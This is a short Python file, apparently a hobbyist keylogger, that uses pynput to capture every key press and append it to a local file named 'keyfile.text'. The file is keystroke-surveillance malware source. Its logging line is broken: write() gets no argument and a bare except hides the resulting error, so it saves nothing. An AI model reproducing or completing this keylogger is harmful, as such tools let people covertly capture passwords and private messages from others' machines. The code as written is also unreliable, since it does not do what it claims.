from pynput import keyboard

# Defines a function for the keylogger 

def keyPressed(key):
    print(str(key))
    with open("keyfile.text",'a') as logKey:
        try:
            char = key.char
            logKey.write()
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()